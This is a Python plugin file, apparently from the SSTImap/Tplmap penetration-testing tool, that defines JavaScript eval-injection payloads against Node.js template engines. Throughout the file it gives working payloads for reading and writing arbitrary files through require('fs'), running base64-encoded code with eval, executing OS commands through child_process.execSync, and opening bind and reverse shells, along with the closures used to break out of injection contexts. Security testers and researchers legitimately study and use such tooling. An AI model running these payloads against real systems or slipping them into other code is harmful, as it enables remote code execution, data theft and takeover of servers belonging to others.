from core import bash
from utils import closures
from core.plugin import Plugin
from utils import rand


class Javascript(Plugin):
    header_type = "add"
    priority = 8
    plugin_info = {
        "Description": """Eval injections in JavaScript. Base for JavaScript-based template engines""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap plugin
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()""",
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            # No evaluate_blind here, since we've no sleep, we'll use inject
            'write': {
                'call': 'inject',
                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')//""",
                'truncate': """require('fs').writeFileSync('{path}', '')"""
            },
            'read': {
                'call': 'render',
                'read': """require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'call': 'render',
                'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """require('os').platform()""",
                'test_os_expected': r'^[\w-]+$',
            },
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind': {
                'call': 'inject',
                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')//"""
            },
            'execute': {
                'call': 'render',
                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2] 
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            }
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # This terminates the statement with ;
            {'level': 1, 'prefix': '{closure};', 'suffix': '//', 'closures': ctx_closures},
            # This does not need termination e.g. if(%s) {}
            {'level': 2, 'prefix': '{closure}', 'suffix': '//', 'closures': ctx_closures},
            # Comment blocks
            {'level': 5, 'prefix': '*/', 'suffix': '/*'},
        ])

    language = 'javascript'


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ],
}

